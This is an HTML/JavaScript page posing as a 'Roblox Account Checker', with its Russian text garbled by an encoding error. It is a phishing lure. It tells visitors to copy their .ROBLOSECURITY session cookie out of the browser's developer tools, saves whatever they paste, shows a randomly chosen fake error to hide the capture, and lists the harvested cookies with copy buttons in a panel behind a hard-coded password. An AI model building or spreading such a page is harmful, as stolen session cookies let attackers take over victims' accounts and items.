<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox Checker</title>
    <style>
        body {
            background: #0d1117;
            color: white;
            font-family: Arial;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        /* –ì–ª–∞–≤–Ω–∞—è */
        #mainPage {
            text-align: center;
        }
        
        h1 {
            color: #ff4757;
            margin: 20px 0;
        }
        
        .card {
            background: #161b22;
            padding: 25px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #30363d;
        }
        
        textarea {
            width: 100%;
            height: 120px;
            padding: 15px;
            background: #0d1117;
            border: 2px solid #238636;
            color: white;
            border-radius: 5px;
            margin: 15px 0;
            font-family: monospace;
            font-size: 14px;
        }
        
        button {
            padding: 12px 25px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
        }
        
        button:hover {
            background: #2ea043;
        }
        
        .status {
            padding: 15px;
            background: #0d1117;
            border-radius: 5px;
            margin: 20px 0;
        }
        
        /* –ê–¥–º–∏–Ω–∫–∞ */
        #adminPage {
            display: none;
        }
        
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .code-item {
            background: #0d1117;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #238636;
        }
        
        .code-text {
            font-family: monospace;
            background: #161b22;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            word-break: break-all;
            font-size: 14px;
        }
        
        .copy-btn {
            background: #3742fa;
            padding: 8px 15px;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .back-btn {
            background: #666;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #8b949e;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ -->
        <div id="mainPage">
            <h1>üîê Roblox Account Checker</h1>
            
            <div class="card">
                <h2>üìã –í—Å—Ç–∞–≤—å—Ç–µ .ROBLOSECURITY –∫—É–∫–∏</h2>
                <p>–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –∫—É–∫–∏: F12 ‚Üí Application ‚Üí Cookies ‚Üí .ROBLOSECURITY</p>
                
                <textarea id="cookieInput" placeholder="–í—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ –≤–∞—à –∫–æ–¥..."></textarea>
                
                <div>
                    <button onclick="saveCode()">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç</button>
                    <button onclick="goToAdmin()" style="background: #3742fa;">üîß –ê–¥–º–∏–Ω–∫–∞</button>
                </div>
                
                <div class="status" id="status">‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ...</div>
            </div>
        </div>
        
        <!-- –ê–¥–º–∏–Ω–∫–∞ -->
        <div id="adminPage">
            <div class="admin-header">
                <h2>üìã –í—Å–µ –∫–æ–¥—ã</h2>
                <div>
                    <button class="back-btn" onclick="goToMain()">‚Üê –ù–∞–∑–∞–¥</button>
                </div>
            </div>
            
            <div id="adminLogin">
                <div class="card">
                    <h3>üîí –í—Ö–æ–¥ –≤ –∞–¥–º–∏–Ω–∫—É</h3>
                    <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" style="width:100%; padding:12px; margin:10px 0; border-radius:5px;">
                    <div>
                        <button onclick="login()">–í–æ–π—Ç–∏</button>
                        <button class="back-btn" onclick="goToMain()">–û—Ç–º–µ–Ω–∞</button>
                    </div>
                </div>
            </div>
            
            <div id="adminContent" style="display:none;">
                <div id="codesList">
                    <!-- –ö–æ–¥—ã –±—É–¥—É—Ç –∑–¥–µ—Å—å -->
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const ADMIN_PASSWORD = 'malik0609';
        
        // –ü–æ–ª—É—á–∏—Ç—å –≤—Å–µ –∫–æ–¥—ã
        function getCodes() {
            const saved = localStorage.getItem('robloxCodes');
            return saved ? JSON.parse(saved) : [];
        }
        
        // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∫–æ–¥
        function saveCodes(codes) {
            localStorage.setItem('robloxCodes', JSON.stringify(codes));
        }
        
        // –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–æ–≤—ã–π –∫–æ–¥ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function saveCode() {
            const input = document.getElementById('cookieInput');
            const code = input.value.trim();
            
            if (!code) {
                document.getElementById('status').innerHTML = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
                return;
            }
            
            document.getElementById('status').innerHTML = '‚è≥ –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ...';
            
            // –î–æ–±–∞–≤–ª—è–µ–º –∫–æ–¥
            const codes = getCodes();
            codes.unshift({
                code: code,
                date: new Date().toLocaleString('ru-RU')
            });
            
            saveCodes(codes);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—à–∏–±–∫—É"
            setTimeout(() => {
                const errors = [
                    '‚ùå –û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫—É–∫–∏',
                    '‚ö†Ô∏è –ö—É–∫–∏ —É—Å—Ç–∞—Ä–µ–ª',
                    'üîí –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ 2FA –∑–∞—â–∏—Ç–∞'
                ];
                document.getElementById('status').innerHTML = errors[Math.floor(Math.random() * errors.length)];
                input.value = '';
            }, 1000);
        }
        
        // –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ –∞–¥–º–∏–Ω–∫—É
        function goToAdmin() {
            document.getElementById('mainPage').style.display = 'none';
            document.getElementById('adminPage').style.display = 'block';
            document.getElementById('adminLogin').style.display = 'block';
            document.getElementById('adminContent').style.display = 'none';
            document.getElementById('password').value = '';
        }
        
        // –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞ –≥–ª–∞–≤–Ω—É—é
        function goToMain() {
            document.getElementById('mainPage').style.display = 'block';
            document.getElementById('adminPage').style.display = 'none';
            document.getElementById('status').innerHTML = '‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ...';
        }
        
        // –í—Ö–æ–¥ –≤ –∞–¥–º–∏–Ω–∫—É
        function login() {
            const password = document.getElementById('password').value;
            
            if (password === ADMIN_PASSWORD) {
                document.getElementById('adminLogin').style.display = 'none';
                document.getElementById('adminContent').style.display = 'block';
                showCodes();
            } else {
                alert('–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
                document.getElementById('password').value = '';
            }
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –∫–æ–¥—ã
        function showCodes() {
            const codes = getCodes();
            const container = document.getElementById('codesList');
            
            if (codes.length === 0) {
                container.innerHTML = '<div class="empty-state">üì≠ –ö–æ–¥–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç</div>';
                return;
            }
            
            let html = '';
            codes.forEach((item, index) => {
                html += `
                    <div class="code-item">
                        <div style="color:#8b949e; font-size:14px;">–ö–æ–¥ #${index + 1}</div>
                        <div class="code-text">${item.code}</div>
                        <button class="copy-btn" onclick="copyCode('${item.code.replace(/'/g, "\\'")}')">
                            üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å
                        </button>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å –∫–æ–¥
        function copyCode(text) {
            navigator.clipboard.writeText(text)
                .then(() => {
                    alert('‚úÖ –ö–æ–¥ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω!');
                })
                .catch(() => {
                    // Fallback –¥–ª—è —Å—Ç–∞—Ä—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤
                    const textarea = document.createElement('textarea');
                    textarea.value = text;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    alert('‚úÖ –ö–æ–¥ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω!');
                });
        }
        
        // –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            console.log('‚úÖ –°–∞–π—Ç –∑–∞–≥—Ä—É–∂–µ–Ω');
            console.log('üîê –ü–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:', ADMIN_PASSWORD);
        };
    </script>
</body>
</html>
